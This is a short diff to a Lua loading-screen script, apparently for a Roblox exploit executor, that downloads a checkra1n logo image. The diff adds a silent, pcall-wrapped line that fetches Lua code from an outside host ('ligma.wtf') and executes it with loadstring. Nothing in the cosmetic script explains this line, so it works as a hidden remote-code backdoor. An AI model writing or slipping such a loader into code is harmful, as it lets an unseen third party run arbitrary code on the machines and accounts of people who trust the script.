@@ -1,4 +1,5 @@
 --// funni checkra1n loading screen by spec
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 local getasset = getsynasset or getcustomasset
 makefolder("loadingimages")
 writefile("loadingimages/checkra1nlogo.png", game:HttpGet("https://raw.githubusercontent.com/scotdotwtf/lua-projects/main/customload/images/checkra1n.png"))
